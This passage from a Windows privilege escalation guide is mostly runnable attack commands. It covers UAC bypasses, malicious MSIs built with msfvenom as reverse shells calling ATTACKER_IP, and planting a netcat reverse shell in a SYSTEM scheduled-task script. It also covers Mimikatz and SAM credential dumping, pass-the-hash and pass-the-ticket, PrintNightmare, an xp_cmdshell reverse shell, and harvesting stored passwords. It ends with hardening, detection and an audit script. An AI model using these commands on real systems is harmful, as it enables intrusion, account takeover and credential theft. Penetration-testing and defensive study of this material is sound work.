  # 2. Launch Event Viewer
  Start-Process "eventvwr.exe"

  # 3. Clean up
  Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="UACME (Comprehensive Tool)"}
  ```powershell [PowerShell — UACME]
  # UACME contains 70+ UAC bypass methods
  # https://github.com/hfiref0x/UACME

  # List available methods
  .\Akagi64.exe

  # Execute a specific bypass (method number)
  .\Akagi64.exe 23 C:\tmp\payload.exe    # Using sdclt.exe
  .\Akagi64.exe 33 C:\tmp\payload.exe    # Using fodhelper.exe
  .\Akagi64.exe 34 C:\tmp\payload.exe    # Using slui.exe
  .\Akagi64.exe 61 C:\tmp\payload.exe    # Using wsreset.exe
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Environment Variable Bypass"}
  ```powershell [PowerShell — DiskCleanup + Env Variable]
  # schtasks DiskCleanup runs as high integrity and uses
  # %windir% environment variable (user-controllable)

  # 1. Set malicious windir
  $env:windir = "cmd /c C:\tmp\reverse.exe &&"

  # 2. Trigger scheduled task
  schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

  # Reset environment
  $env:windir = "C:\Windows"
  ```
  :::
::

::note
UAC bypasses only work when the user is a **local Administrator** running at Medium integrity. If you're a standard user, UAC bypasses are not applicable — you need a different escalation technique first.
::

---

### Technique 5 — Registry-Based Escalation

::accordion
  :::accordion-item{icon="i-lucide-package" label="AlwaysInstallElevated → MSI as SYSTEM"}

  If both `AlwaysInstallElevated` registry keys are set to `1`, **any user** can install MSI packages with **SYSTEM privileges**.

  ```powershell [PowerShell — Check and Exploit]
  # Check if vulnerable
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  # Both must return: AlwaysInstallElevated    REG_DWORD    0x1

  # If vulnerable — generate malicious MSI
  ```

  ```bash [Attacker — Generate MSI Payload]
  # Reverse shell MSI
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f msi -o evil.msi

  # Add user MSI
  msfvenom -p windows/adduser USER=hacker PASS=Password123! \
    -f msi -o adduser.msi
  ```

  ```powershell [Target — Install Malicious MSI]
  # Install as SYSTEM
  msiexec /quiet /qn /i C:\tmp\evil.msi

  # /quiet — no UI
  # /qn — no GUI at all
  # /i — install
  # Runs as NT AUTHORITY\SYSTEM!
  ```
  :::

  :::accordion-item{icon="i-lucide-play" label="AutoRun Programs"}

  If AutoRun executables are in **writable** directories, replace them with your payload — they run at startup with the **logged-in user's privileges**.

  ```powershell [PowerShell — Find AutoRun Entries]
  # Registry autorun locations
  $paths = @(
      "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
      "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
      "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
      "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
      "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
  )
  foreach ($path in $paths) {
      Get-ItemProperty $path -ErrorAction SilentlyContinue |
        Select * -ExcludeProperty PS* | Format-List
  }

  # Check if any autorun executables are writable
  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" |
    Select -ExpandProperty * -ErrorAction SilentlyContinue |
    ForEach-Object { icacls $_ 2>$null }

  # Startup folder
  Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
  Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
  ```
  :::

  :::accordion-item{icon="i-lucide-user-check" label="AutoLogon Credentials"}

  ```powershell [PowerShell — Check AutoLogon]
  # Plaintext credentials stored in registry!
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName

  # If DefaultPassword exists — you have plaintext creds!
  # Try:
  runas /user:DOMAIN\Username cmd.exe
  # Enter the found password
  ```
  :::
::

---

### Technique 6 — Scheduled Tasks

::steps{level="4"}

#### Enumerate Scheduled Tasks

```powershell [PowerShell — Find Exploitable Tasks]
# List all scheduled tasks with details
schtasks /query /fo LIST /v | findstr /i "Task Name\|Run As User\|Task To Run"

# PowerShell method with more detail
Get-ScheduledTask | Where-Object { $_.State -eq 'Ready' } |
  ForEach-Object {
    $task = $_
    $info = $_ | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
    [PSCustomObject]@{
      Name     = $task.TaskName
      Path     = $task.TaskPath
      RunAs    = $task.Principal.UserId
      Action   = ($task.Actions | Select -First 1).Execute
      Args     = ($task.Actions | Select -First 1).Arguments
      LastRun  = $info.LastRunTime
    }
  } | Where-Object { $_.RunAs -like "*SYSTEM*" -or $_.RunAs -like "*Admin*" } |
  Format-Table -AutoSize
```

#### Check Script Permissions

```powershell [PowerShell — Check if Task Scripts are Writable]
# For each task running as SYSTEM, check if we can modify the script
schtasks /query /fo LIST /v | findstr /i "Task To Run" |
  ForEach-Object {
    $script = ($_ -split "Task To Run:")[1].Trim()
    if (Test-Path $script) {
      $acl = icacls $script 2>$null
      if ($acl -match "(M|F|W).*(Users|Everyone|Authenticated)") {
        Write-Host "[!] WRITABLE: $script" -ForegroundColor Red
      }
    }
  }
```

#### Exploit Writable Task

```powershell [PowerShell — Inject Into Scheduled Task]
# If the task runs C:\Scripts\backup.ps1 as SYSTEM and we can write to it:

# Append reverse shell
Add-Content "C:\Scripts\backup.ps1" "`nC:\tmp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

# Or replace entirely
Set-Content "C:\Scripts\backup.ps1" "C:\tmp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

# Wait for scheduled execution or trigger manually (if permitted)
schtasks /run /tn "BackupTask"
```

::

---

### Technique 7 — Credential Harvesting

::tabs
  :::tabs-item{icon="i-lucide-key" label="Mimikatz"}
  ```powershell [PowerShell — Mimikatz Credential Extraction]
  # REQUIRES: Admin/SYSTEM privileges (or SeDebugPrivilege)

  # Dump all credentials from memory
  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  # Output includes:
  # - Plaintext passwords (if WDigest enabled)
  # - NTLM hashes
  # - Kerberos tickets
  # - DPAPI keys

  # Dump SAM database
  mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

  # Dump cached domain credentials
  mimikatz.exe "privilege::debug" "lsadump::cache" "exit"

  # Extract LSA secrets
  mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"

  # DCSync (Domain Controller — requires replication rights)
  mimikatz.exe "lsadump::dcsync /user:Administrator /domain:corp.local" "exit"
  ```

  ::warning
  Mimikatz is **heavily signatured** by every AV/EDR. In modern environments, use alternative methods like **lsass dump + offline extraction**, **BOFs**, or **NanoDump**.
  ::
  :::

  :::tabs-item{icon="i-lucide-database" label="SAM / Registry Dumps"}
  ```powershell [PowerShell — Dump Without Mimikatz]
  # Method 1: reg save (requires admin)
  reg save HKLM\SAM C:\tmp\SAM
  reg save HKLM\SYSTEM C:\tmp\SYSTEM
  reg save HKLM\SECURITY C:\tmp\SECURITY

  # Method 2: Volume Shadow Copy
  wmic shadowcopy call create Volume=C:\
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\tmp\SAM
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\tmp\SYSTEM

  # Method 3: Using esentutl (LOLBin)
  esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\tmp\SAM
  esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\tmp\SYSTEM
  ```

  ```bash [Attacker — Extract Hashes]
  # Using Impacket secretsdump
  secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

  # Output:
  # Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75...:::
  # Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae...:::

  # Crack with hashcat (NTLM = mode 1000)
  hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

  # Or Pass-the-Hash directly
  psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e19ccf75... Administrator@TARGET_IP
  ```
  :::

  :::tabs-item{icon="i-lucide-file-search" label="Stored Credentials"}
  ```powershell [PowerShell — Find Stored Credentials]
  # Windows Credential Manager
  cmdkey /list
  # If entries exist, use them:
  runas /savecred /user:Administrator cmd.exe

  # DPAPI — Decrypt saved credentials
  # Browser passwords, Wi-Fi passwords, vault credentials
  # are protected by DPAPI master keys

  # Find DPAPI master keys
  Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Credentials\
  Get-ChildItem C:\Users\*\AppData\Local\Microsoft\Credentials\

  # Decrypt with Mimikatz
  mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\...\<GUID>" "exit"

  # Saved Wi-Fi passwords
  netsh wlan show profiles
  netsh wlan show profile name="WiFiName" key=clear

  # IIS Application Pool credentials
  C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*

  # Unattend/Sysprep files
  type C:\Windows\Panther\Unattend.xml 2>$null
  type C:\Windows\Panther\Autounattend.xml 2>$null
  type C:\Windows\sysprep\sysprep.xml 2>$null
  # Look for <Password> and <AutoLogon> tags with Base64 encoded passwords
  ```
  :::

  :::tabs-item{icon="i-lucide-lock" label="Group Policy Preferences (GPP)"}
  ```powershell [PowerShell — GPP Password (cPassword)]
  # MS14-025 — GPP stored passwords in SYSVOL using
  # reversible AES-256 encryption (Microsoft published the key!)

  # Search SYSVOL for Group.xml, Services.xml, etc.
  findstr /si "cpassword" \\DOMAIN\SYSVOL\*.xml

  # Common locations:
  # \\DOMAIN\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
  # \\DOMAIN\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Services\Services.xml

  # Decrypt with PowerSploit
  Get-GPPPassword

  # Or with gpp-decrypt (Kali)
  gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
  ```

  ::note
  While Microsoft patched GPP password storage in **2014** (MS14-025), many organizations still have **old GPP XML files in SYSVOL** that were never cleaned up. Always check.
  ::
  :::
::

---

### Technique 8 — Kernel Exploits

::accordion
  :::accordion-item{icon="i-lucide-flame" label="Notable Windows Kernel Exploits"}

  | CVE | Name | Affected Versions | Year |
  |---|---|---|---|
  | CVE-2024-30088 | **Windows Kernel EoP** | Win 11 23H2, Server 2022 | 2024 |
  | CVE-2023-36874 | **Windows Error Reporting** | Win 10/11, Server 2016–2022 | 2023 |
  | CVE-2023-28252 | **CLFS Driver EoP** | Win 10/11, Server 2016–2022 | 2023 |
  | CVE-2022-21999 | **Print Spooler EoP** | Win 10/11, Server 2016–2022 | 2022 |
  | CVE-2021-34527 | **PrintNightmare** | Win 7–11, Server 2008–2019 | 2021 |
  | CVE-2021-1732 | **Win32k EoP** | Win 10 20H2, Server 2004 | 2021 |
  | CVE-2020-0787 | **BITS EoP** | Win 7–10, Server 2008–2019 | 2020 |
  | CVE-2019-1388 | **UAC Cert Dialog** | Win 7–10, Server 2008–2019 | 2019 |
  | CVE-2018-8120 | **Win32k EoP** | Win 7, Server 2008 | 2018 |
  | CVE-2016-3309 | **Win32k EoP** | Win 7–10, Server 2008–2016 | 2016 |
  | MS16-032 | **Secondary Logon** | Win 7–10, Server 2008–2012 | 2016 |
  | MS15-051 | **Win32k EoP** | Win 7/8, Server 2008/2012 | 2015 |

  :::

  :::accordion-item{icon="i-lucide-printer" label="PrintNightmare (CVE-2021-34527)"}

  ```powershell [PowerShell — Check Vulnerability]
  # Check if Print Spooler is running
  Get-Service Spooler

  # Check if vulnerable (NoWarningNoElevationOnInstall)
  reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
  # If NoWarningNoElevationOnInstall = 1 → Vulnerable!
  ```

  ```bash [Attacker — Exploit PrintNightmare]
  # Method 1: Remote — Add admin user
  python3 CVE-2021-34527.py 'corp.local/user:Password123@TARGET_IP' \
    '\\ATTACKER_IP\share\evil.dll'

  # Method 2: Local — Using PowerShell PoC
  Import-Module .\CVE-2021-34527.ps1
  Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!" -DriverName "PrintMe"

  # Result:
  # [+] Created user hacker with password Password123!
  # [+] Adding user to local administrators group
  ```

  ::caution
  PrintNightmare has both **Local Privilege Escalation (LPE)** and **Remote Code Execution (RCE)** variants. The LPE variant is more reliable and works even when the RCE variant is patched.
  ::
  :::

  :::accordion-item{icon="i-lucide-code" label="Using Windows Exploit Suggester"}
  ```bash [Attacker — Find Applicable Exploits]
  # 1. Export systeminfo from target
  # On target:
  systeminfo > systeminfo.txt

  # 2. Run WES-NG
  wes --update
  wes systeminfo.txt --impact "Elevation of Privilege" -e

  # 3. Review results and cross-reference with available exploits
  # Check: https://github.com/SecWiki/windows-kernel-exploits

  # 4. Common pre-compiled exploit repositories:
  # https://github.com/SecWiki/windows-kernel-exploits
  # https://github.com/abatchy17/WindowsExploits
  ```
  :::
::

---

### Technique 9 — Pass-the-Hash (PTH) & Pass-the-Ticket

Once you have **NTLM hashes** or **Kerberos tickets**, use them to authenticate without knowing the plaintext password.

::tabs
  :::tabs-item{icon="i-lucide-key-round" label="Pass-the-Hash"}
  ```bash [Attacker — PTH with Impacket]
  # psexec.py — Get interactive SYSTEM shell
  psexec.py -hashes :e19ccf75ee54e06b06a5907af13cef42 Administrator@10.0.0.100

  # wmiexec.py — Stealthier (no service creation)
  wmiexec.py -hashes :e19ccf75ee54e06b06a5907af13cef42 Administrator@10.0.0.100

  # smbexec.py — Uses SMB for execution
  smbexec.py -hashes :e19ccf75ee54e06b06a5907af13cef42 Administrator@10.0.0.100

  # atexec.py — Uses Task Scheduler
  atexec.py -hashes :e19ccf75ee54e06b06a5907af13cef42 Administrator@10.0.0.100 "whoami"

  # Using CrackMapExec/NetExec
  nxc smb 10.0.0.0/24 -u Administrator -H e19ccf75ee54e06b06a5907af13cef42 --local-auth
  nxc smb 10.0.0.100 -u Administrator -H e19ccf75ee54e06b06a5907af13cef42 -x "whoami"
  ```
  :::

  :::tabs-item{icon="i-lucide-ticket" label="Pass-the-Ticket"}
  ```powershell [Mimikatz — Kerberos Ticket Manipulation]
  # Export all Kerberos tickets from memory
  mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

  # Inject a ticket into current session
  mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

  # Verify
  klist

  # Use the ticket to access resources
  dir \\DC01\C$
  ```

  ```bash [Attacker — Using Impacket]
  # Request TGT with hash
  getTGT.py -hashes :e19ccf75ee54e06b06a5907af13cef42 corp.local/Administrator

  # Use TGT
  export KRB5CCNAME=Administrator.ccache
  psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
  ```
  :::

  :::tabs-item{icon="i-lucide-repeat" label="Overpass-the-Hash"}
  ```powershell [Mimikatz — Overpass-the-Hash]
  # Convert NTLM hash to Kerberos TGT
  # Useful when NTLM is blocked but Kerberos isn't
  
  mimikatz.exe "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:e19ccf75... /run:cmd.exe" "exit"

  # A new cmd.exe opens with the Administrator's Kerberos identity
  # Now access resources using Kerberos:
  dir \\DC01\C$
  psexec.exe \\DC01 cmd.exe
  ```
  :::
::

---

### Technique 10 — Additional Attack Vectors

::accordion
  :::accordion-item{icon="i-lucide-router" label="Named Pipe Impersonation"}

  Services and applications use **named pipes** for inter-process communication. If a privileged process connects to a pipe you control, you can **impersonate** its token.

  ```powershell [PowerShell — Named Pipe Attack]
  # Check existing named pipes
  Get-ChildItem \\.\pipe\ | Select Name
  [System.IO.Directory]::GetFiles("\\.\\pipe\\")

  # Using Metasploit
  meterpreter> getsystem
  # Attempts named pipe impersonation automatically
  # Technique 1: Named Pipe Impersonation (In Memory/Admin)
  # Technique 2: Named Pipe Impersonation (Dropper/Admin)
  # Technique 3: Token Duplication (In Memory/Admin)
  ```
  :::

  :::accordion-item{icon="i-lucide-database" label="MSSQL Privilege Escalation"}

  If you have **sysadmin** role in MSSQL running as a service account:

  ```sql [MSSQL — Enable xp_cmdshell]
  -- Check current user
  SELECT SYSTEM_USER;
  SELECT IS_SRVROLEMEMBER('sysadmin');

  -- Enable xp_cmdshell
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;

  -- Execute OS commands as the SQL service account
  EXEC xp_cmdshell 'whoami';
  -- Output: nt service\mssqlserver (or nt authority\system)

  -- Reverse shell
  EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
  ```

  ```sql [MSSQL — Impersonate Other Users]
  -- Check impersonatable logins
  SELECT distinct b.name
  FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

  -- Impersonate sa
  EXECUTE AS LOGIN = 'sa';
  EXEC xp_cmdshell 'whoami';
  ```
  :::

  :::accordion-item{icon="i-lucide-link" label="Insecure File/Folder Permissions"}

  ```powershell [PowerShell — Writable Program Directories]
  # Check if C:\Program Files subdirectories are writable
  Get-ChildItem "C:\Program Files" -Directory | ForEach-Object {
      $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
      $acl.Access | Where-Object {
          ($_.IdentityReference -match "Users|Everyone|Authenticated") -and
          ($_.FileSystemRights -match "Write|Modify|FullControl")
      } | ForEach-Object {
          Write-Host "[!] $($_.IdentityReference): $($acl.Path)" -ForegroundColor Red
      }
  }

  # Check writable directories in system PATH
  $env:PATH.Split(';') | ForEach-Object {
      if (Test-Path $_) {
          try {
              [io.file]::OpenWrite("$_\test.txt").Close()
              Remove-Item "$_\test.txt"
              Write-Host "[!] WRITABLE PATH DIR: $_" -ForegroundColor Red
          } catch {}
      }
  }

  # DLL search order abuse in writable PATH directories
  # Place malicious DLL in a writable PATH directory
  # that comes BEFORE the legitimate DLL's directory
  ```
  :::

  :::accordion-item{icon="i-lucide-hard-drive" label="Mounted Drives & Shares"}
  ```powershell [PowerShell — Explore Mounted Resources]
  # Currently mapped drives
  Get-PSDrive -PSProvider FileSystem
  net use
  wmic logicaldisk get caption, description, providername

  # Available network shares (may contain sensitive data)
  net view \\localhost /all
  net view \\DC01 /all 2>$null

  # Search mapped drives for credentials
  Get-ChildItem -Path Z:\ -Recurse -Include *.txt,*.ini,*.config,*.xml `
    -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|credential|secret" -List |
    Select Path
  ```
  :::

  :::accordion-item{icon="i-lucide-monitor" label="Always Check — Quick Wins"}
  ```powershell [PowerShell — Low-Hanging Fruit]
  # 1. Cached credentials (runas /savecred)
  cmdkey /list
  # If found: runas /savecred /user:DOMAIN\Admin cmd.exe

  # 2. Stored Wi-Fi passwords
  netsh wlan show profiles
  netsh wlan show profile name="CorpWiFi" key=clear

  # 3. Clipboard contents
  Get-Clipboard

  # 4. Recent documents
  Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" | Select Name, LastWriteTime

  # 5. Browser saved passwords (if admin)
  # Use tools like SharpChrome, LaZagne

  # 6. KeePass databases
  Get-ChildItem -Path C:\ -Recurse -Include *.kdbx -ErrorAction SilentlyContinue

  # 7. PuTTY stored sessions
  reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

  # 8. FileZilla saved credentials
  type "%APPDATA%\FileZilla\recentservers.xml" 2>$null
  type "%APPDATA%\FileZilla\sitemanager.xml" 2>$null

  # 9. Jenkins credentials (if Jenkins installed)
  type "C:\Users\*\.jenkins\credentials.xml" 2>$null
  type "C:\Program Files\Jenkins\credentials.xml" 2>$null
  ```
  :::
::

---

## Quick Reference — Escalation Checklist

| # | Check | Command | What to Look For |
|---|---|---|---|
| 1 | Current privileges | `whoami /priv` | SeImpersonate, SeDebug, SeBackup |
| 2 | Patch level | `systeminfo` | Missing patches → kernel exploits |
| 3 | Unquoted service paths | `wmic service get pathname` | Paths with spaces, no quotes |
| 4 | Writable service binaries | `accesschk -wvu` | Modify/Write/FullControl |
| 5 | Weak service ACLs | `accesschk -uwcqv "Users"` | SERVICE_CHANGE_CONFIG |
| 6 | AlwaysInstallElevated | `reg query HKLM\...\Installer` | Value = 0x1 |
| 7 | AutoLogon creds | `reg query Winlogon` | DefaultPassword |
| 8 | Saved creds | `cmdkey /list` | Stored credentials |
| 9 | Scheduled tasks | `schtasks /query /fo LIST /v` | Writable scripts running as SYSTEM |
| 10 | Unattend files | `dir /s Unattend.xml` | Plaintext passwords |
| 11 | SAM/SYSTEM backup | `dir C:\Windows\repair\` | Readable backups |
| 12 | GPP passwords | `findstr /si cpassword SYSVOL` | Encrypted (but decryptable) creds |
| 13 | Running services as SYSTEM | `tasklist /v` | Vulnerable services |
| 14 | DLL hijacking | Process Monitor | Missing DLLs |
| 15 | PowerShell history | `Get-Content (Get-PSReadLineOption).HistorySavePath` | Commands with passwords |

---

## Detection & Defense

::tabs
  :::tabs-item{icon="i-lucide-shield-check" label="Hardening Checklist"}

  | # | Control | Priority | Implementation |
  |---|---|---|---|
  | 1 | **Patch regularly** | 🔴 Critical | WSUS, SCCM, or Intune patching |
  | 2 | **Fix unquoted service paths** | 🔴 Critical | Wrap all paths in quotes |
  | 3 | **Restrict service permissions** | 🔴 Critical | Remove Users/Everyone write access |
  | 4 | **Disable AlwaysInstallElevated** | 🔴 Critical | Set both registry keys to 0 |
  | 5 | **Remove AutoLogon credentials** | 🟠 High | Clear DefaultPassword |
  | 6 | **Enforce UAC (max level)** | 🟠 High | Always notify for elevation |
  | 7 | **Enable Credential Guard** | 🟠 High | Virtualization-based security |
  | 8 | **Disable WDigest** | 🟠 High | Prevents plaintext passwords in memory |
  | 9 | **Clean up GPP XML files** | 🟠 High | Remove old cPassword entries |
  | 10 | **Restrict SeImpersonate** | 🟡 Medium | Only grant to required service accounts |
  | 11 | **Enable PowerShell logging** | 🟡 Medium | Script Block, Module, Transcription |
  | 12 | **Deploy LAPS** | 🟡 Medium | Randomize local admin passwords |
  | 13 | **Disable Print Spooler** on servers | 🟡 Medium | Prevents PrintNightmare & SpoolSample |
  | 14 | **Remove local admin rights** from users | 🟡 Medium | Principle of least privilege |

  :::

  :::tabs-item{icon="i-lucide-search" label="Detection (Event Logs)"}

  ::field-group
    ::field{name="Event ID 4624 (Type 10)" type="Security"}
    Remote interactive logon (RDP). Alert on unexpected admin RDP sessions.
    ::

    ::field{name="Event ID 4648" type="Security"}
    Explicit credential logon (`runas /savecred`). Alert on use of stored credentials.
    ::

    ::field{name="Event ID 4697 / 7045" type="Security / System"}
    New service installed. Alert on service creation — ntlmrelayx, Potato attacks, and exploits create services for execution.
    ::

    ::field{name="Event ID 4688" type="Security"}
    Process creation (with command line). Monitor for suspicious processes: `mimikatz`, `procdump`, `whoami /priv`, `reg save`, encoded PowerShell.
    ::

    ::field{name="Event ID 4672" type="Security"}
    Special privileges assigned to new logon. Triggers when tokens with dangerous privileges (SeDebug, SeImpersonate) are created.
    ::

    ::field{name="Event ID 1102" type="Security"}
    Audit log cleared. Attackers often clear logs after escalation — this itself is a high-fidelity alert.
    ::

    ::field{name="Event ID 4104" type="PowerShell Operational"}
    PowerShell Script Block Logging. Captures the **full text** of PowerShell scripts executed, including obfuscated code after deobfuscation.
    ::
  ::

  ```powershell [PowerShell — Enable Advanced Auditing]
  # Enable Process Creation auditing with command line
  auditpol /set /subcategory:"Process Creation" /success:enable
  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
    /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

  # Enable PowerShell Script Block Logging
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f

  # Enable PowerShell Module Logging
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
    /v EnableModuleLogging /t REG_DWORD /d 1 /f

  # Enable PowerShell Transcription
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
    /v EnableTranscripting /t REG_DWORD /d 1 /f
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
    /v OutputDirectory /t REG_SZ /d "C:\PSTranscripts" /f
  ```
  :::

  :::tabs-item{icon="i-lucide-lock" label="Credential Protection"}
  ```powershell [PowerShell — Protect Credentials]
  # 1. Disable WDigest (prevents plaintext passwords in memory)
  reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest `
    /v UseLogonCredential /t REG_DWORD /d 0 /f

  # 2. Enable Credential Guard (Windows 10/11 Enterprise)
  # Via Group Policy:
  # Computer Config → Admin Templates → System → Device Guard
  # → Turn On Virtualization Based Security → Enabled
  # → Credential Guard Configuration → Enabled with UEFI lock

  # 3. Enable LSA Protection (RunAsPPL)
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" `
    /v RunAsPPL /t REG_DWORD /d 1 /f
  # Prevents non-PPL processes from accessing lsass.exe

  # 4. Deploy LAPS
  # Randomizes local Administrator password on every machine
  Import-Module LAPS
  Update-LapsADSchema
  Set-LapsADComputerSelfPermission -Identity "OU=Workstations,DC=corp,DC=local"

  # 5. Disable cached credentials (or reduce count)
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" `
    /v CachedLogonsCount /t REG_SZ /d 0 /f
  # Default is 10 — set to 0 or 1 for servers
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Hardening Script"}
  ```powershell [harden-privesc.ps1 — Automated Hardening Audit]
  # Run as Administrator

  Write-Host "`n[*] Windows Privilege Escalation Hardening Audit`n" -ForegroundColor Cyan

  # Check unquoted service paths
  Write-Host "[*] Checking unquoted service paths..." -ForegroundColor Yellow
  Get-WmiObject win32_service | Where-Object {
    $_.PathName -notlike '"*' -and $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -like '* *'
  } | ForEach-Object {
    Write-Host "  [!] UNQUOTED: $($_.Name) → $($_.PathName)" -ForegroundColor Red
  }

  # Check AlwaysInstallElevated
  Write-Host "[*] Checking AlwaysInstallElevated..." -ForegroundColor Yellow
  $hklm = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
  $hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
  if ($hklm -eq 1 -and $hkcu -eq 1) {
    Write-Host "  [!] AlwaysInstallElevated is ENABLED — CRITICAL!" -ForegroundColor Red
  } else {
    Write-Host "  [+] AlwaysInstallElevated is not set" -ForegroundColor Green
  }

  # Check AutoLogon
  Write-Host "[*] Checking AutoLogon credentials..." -ForegroundColor Yellow
  $autoPass = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
  if ($autoPass) {
    Write-Host "  [!] AutoLogon password FOUND in registry — CRITICAL!" -ForegroundColor Red
  } else {
    Write-Host "  [+] No AutoLogon password stored" -ForegroundColor Green
  }

  # Check WDigest
  Write-Host "[*] Checking WDigest status..." -ForegroundColor Yellow
  $wdigest = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -ErrorAction SilentlyContinue).UseLogonCredential
  if ($wdigest -eq 1) {
    Write-Host "  [!] WDigest is ENABLED — plaintext passwords in memory!" -ForegroundColor Red
  } else {
    Write-Host "  [+] WDigest is disabled" -ForegroundColor Green
  }

  # Check LSA Protection
  Write-Host "[*] Checking LSA Protection (RunAsPPL)..." -ForegroundColor Yellow
  $ppl = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
  if ($ppl -eq 1) {
    Write-Host "  [+] LSA Protection is enabled" -ForegroundColor Green
  } else {
    Write-Host "  [!] LSA Protection is NOT enabled" -ForegroundColor Red
  }

  # Check Credential Guard
  Write-Host "[*] Checking Credential Guard..." -ForegroundColor Yellow
  $cg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
  if ($cg.SecurityServicesRunning -contains 1) {
    Write-Host "  [+] Credential Guard is running" -ForegroundColor Green
  } else {
    Write-Host "  [!] Credential Guard is NOT running" -ForegroundColor Red
  }

  # Check PowerShell logging
  Write-Host "[*] Checking PowerShell logging..." -ForegroundColor Yellow
  $sbl = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -ErrorAction SilentlyContinue).EnableScriptBlockLogging
  if ($sbl -eq 1) {
    Write-Host "  [+] Script Block Logging is enabled" -ForegroundColor Green
  } else {
    Write-Host "  [!] Script Block Logging is NOT enabled" -ForegroundColor Red
  }

  Write-Host "`n[*] Audit complete.`n" -ForegroundColor Cyan
